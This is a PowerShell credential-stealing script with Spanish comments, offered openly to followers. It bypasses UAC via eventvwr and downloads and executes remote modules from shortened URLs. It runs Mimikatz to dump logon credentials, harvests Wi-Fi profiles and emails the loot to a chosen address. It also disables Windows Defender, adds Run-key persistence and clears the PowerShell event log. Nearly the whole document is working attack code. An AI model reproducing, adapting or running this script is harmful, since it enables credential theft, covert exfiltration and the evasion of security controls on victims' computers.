# Powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2eA6vFE'); Send-Creds -To 'correo@example.com'

# Este script es una forma de disculparme con todos mis suscriptores/seguidores por la larga inactividad, espero entiendan que mi tiempo es muy limitado :D
# What it does?
# 1 - Escala privilegios
# 2 - Obtiene las credenciales de inicio de sesion
# 3 - Envia la informacion al correo especificado

# Funciona con Powershell 2+ o sea desde win7+

#Function Send-Creds {
	Param (
		$From,
		$Password,
		$To
	)
	$Command = "
		# Import Send-Email module
		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2duH9Yu')
		
		#Mimikatz
		try {
			# Import Mimikatz module
			Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/1N83FXO')
			`$Information = Invoke-Mimikatz -DumpCreds
		} catch {}
		
		#Wlan Profiles
		try {
			# Import Module
			Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2etS486')
			`$Information += Get-WLAN_Profiles -LANGUAGE es-ES | Format-Table | Out-String
		} catch {}
		
		# Send Email
		`$Subject = 'Information_Gathered - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
		Send-Email -From '$from' -Password '$Password' -To '$To' -Subject `$Subject -Body `$Information
		
		# Clear EventLog
		Clear-EventLog -LogName 'Windows PowerShell'
	"

		### Antimalware service detected
		$MsMpEngBypass = "
		# Import module to Enable/Disable WindowsDefender
		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2ejyXkA')
		# Disable WindowsDefender
		Set-WindowsDefender -Mode Disabled

		`$Path = 'HKCU:\Software\Microsoft\Powershell'
		`$mscCommandPath = 'HKCU:\Software\Classes\mscfile\shell\open\command'
		`$RunPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            
            
		`$Command = `"
        # Wait until windows load
        Start-Sleep 60
		" + $Command.Replace('$','`$') + "
		## Clean Up ##
		Remove-ItemProperty -Path ```$Path -Name 'Command' -Force -ErrorAction SilentlyContinue
		Remove-ItemProperty -Path ```$mscCommandPath -Name '(Default)' -Force -ErrorAction SilentlyContinue
		Remove-ItemProperty -Path ```$RunPath -Name 'eventvwr' -Force -ErrorAction SilentlyContinue

		# Import module to Enable/Disable WindowsDefender
		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2ejyXkA')
		# Enable WindowsDefender
		Set-WindowsDefender -Mode Enabled
		`"
        

		# Save command in the register
		Remove-ItemProperty -Path `$Path -Name 'Command' -Force -ErrorAction SilentlyContinue
		New-ItemProperty -Path `$Path -Name 'Command' -Value `$Command -PropertyType string -Force | Out-Null

		# Save launcher of the command
        New-Item `$mscCommandPath -Force -ErrorAction Continue | Out-Null
		Remove-ItemProperty -Path `$mscCommandPath -Name '(Default)' -Force -ErrorAction SilentlyContinue
		New-ItemProperty -Path `$mscCommandPath -Name '(Default)' -Value 'Powershell Invoke-Expression (Get-ItemProperty -Path HKCU:\Software\Microsoft\Powershell).Command' -PropertyType string -Force | Out-Null

		# Add eventvwr to run at the start up
		Remove-ItemProperty -Path `$RunPath -Name 'eventvwr' -Force -ErrorAction SilentlyContinue
		New-ItemProperty -Path `$RunPath -Name 'eventvwr' -Value (Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe') -PropertyType string -Force | Out-Null
		"
	
	# Test Admin
	if ((New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
		if (Get-Process -Name MsMpEng -ErrorAction SilentlyContinue) {
			Invoke-Expression $MsMpEngBypass
		} else {
			Invoke-Expression $Command
		}
	} else {
		# Fileless bypass
		# Import EventVwrBypass module
		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bKS5oM')
		
		if (Get-Process -Name MsMpEng -ErrorAction SilentlyContinue) {
			$Command = $MsMpEngBypass
		}
		# Save command in the register
		$Path = 'HKCU:\Software\Microsoft\Powershell'
		Remove-ItemProperty -Path $Path -Name 'Command' -Force -ErrorAction SilentlyContinue
		New-ItemProperty -Path $Path -Name 'Command' -Value $Command -PropertyType string -Force | Out-Null
		# Execute bypass w/encoded command
		Invoke-EventVwrBypass -Command 'Powershell Invoke-Expression (Get-ItemProperty -Path HKCU:\Software\Microsoft\Powershell).Command' -Force
		# Remove command from the register
		Remove-ItemProperty -Path $Path -Name 'Command' -Force
	}
#}

